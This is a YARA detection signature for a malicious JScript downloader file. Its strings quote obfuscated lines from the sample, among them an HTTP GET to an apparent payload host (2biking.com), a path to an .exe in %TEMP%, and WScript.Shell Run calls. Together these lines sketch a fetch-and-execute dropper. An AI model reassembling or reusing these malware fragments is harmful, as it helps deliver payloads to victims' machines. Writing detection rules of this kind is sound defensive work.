rule sig_20160328_5dd31c1e0822383ce2b114b6c9769460 {
  meta:
    description = "datamaliciousorder - file 20160328_5dd31c1e0822383ce2b114b6c9769460.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "10759e4484c527a29fee0f2de969dd1c2cb04b52e15ae6088aa4fb6050c68ef0"

  strings:
    $s1  = "function Yyyyyabkno() {return Tmqsajonj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"XPwwsAqD4RznA.exe\";};" fullword ascii
    $s2  = "Hxpiktryh[Olzqk](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Tlduwsqbzh](Uyzjokyebt() * 11)} while (Hxpiktryh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Tmqsajonj = function Owqroktl() {return WScript[Kbgapqf](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Vxenpesrhu(Usfqargz, Pmnjr){return Usfqargz - Pmnjr;};" fullword ascii
    $s6  = "function Kxeumx(Ljpah){Tmqsajonj[\"Run\"](Ljpah, Wlxbwlefz, Wlxbwlefz);};" fullword ascii
    $s7  = "var Jlmojce = new this[\"Date\"]();" fullword ascii
    $s8  = "function Wkhkohmo(Lnaedqjpp) {var Stdjnypq = (1, 2, 3, 4, 5, Lnaedqjpp); return Stdjnypq;};" fullword ascii
    $s9  = "function Cthcjh(){return Kbgapqf;};" fullword ascii
    $s10 = "var Xxsoebbuev = false;" fullword ascii
    $s11 = "function Jropxjcq()" fullword ascii
    $s12 = "var Rpfqpiyse = false;" fullword ascii
    $s13 = "return Vxenpesrhu(Fampntnc, Fybfksqczw);" fullword ascii
    $s14 = " while (Iraypgkk){" fullword ascii
    $s15 = "function Uyzjokyebt(){return 22;};" fullword ascii
    $s16 = "Xxsoebbuev = true; " fullword ascii
    $s17 = "function Svmczpfgn(){return Oxjgdgpn;};" fullword ascii
    $s18 = "function Mwpobvvfo() {return ((Xxsoebbuev == true) && (Xxsoebbuev == Vngcardtve)) ? 1 : Wlxbwlefz;};" fullword ascii
    $s19 = "var Vngcardtve = false;" fullword ascii
    $s20 = "Vngcardtve = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}